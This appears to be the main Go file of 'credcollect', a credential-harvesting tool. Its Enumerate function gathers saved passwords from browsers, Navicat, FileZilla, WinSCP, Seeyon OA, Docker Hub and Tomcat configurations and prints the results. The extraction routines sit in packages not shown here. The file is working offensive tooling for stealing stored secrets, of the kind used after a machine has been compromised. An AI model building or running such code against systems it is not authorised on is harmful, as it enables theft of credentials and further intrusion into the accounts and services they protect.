package credcollect

import (
	"github.com/404tk/credcollect/common"
	"github.com/404tk/credcollect/pkg/browser"
	"github.com/404tk/credcollect/pkg/docker"
	"github.com/404tk/credcollect/pkg/filezilla"
	"github.com/404tk/credcollect/pkg/navicat"
	"github.com/404tk/credcollect/pkg/seeyon"
	"github.com/404tk/credcollect/pkg/tomcat"
	"github.com/404tk/credcollect/pkg/winscp"
)

type Options struct {
	Silent bool
	Output string
}

type Output struct {
	Browser   []common.BrowserPassword
	Navicat   []common.NavicatPassWord
	FileZilla []common.FileZillaPassWord
	WinScp    []common.WinScpPassWord
	SeeyonOA  []common.SeeyonPassWord
	DockerHub []common.DockerHubPassWord
	Tomcat    []common.TomcatPassWord
}

func (opt *Options) Enumerate() Output {
	var result Output
	result.Browser = browser.GetBrowserData()
	result.Navicat = navicat.Navicat()
	result.FileZilla = filezilla.FileZilla()
	result.WinScp = winscp.WinScp()
	result.SeeyonOA = seeyon.SeeyonOA()
	result.DockerHub = docker.DockerHub()
	result.Tomcat = tomcat.TomcatManager()
	opt.PrintResult(result)
	return result
}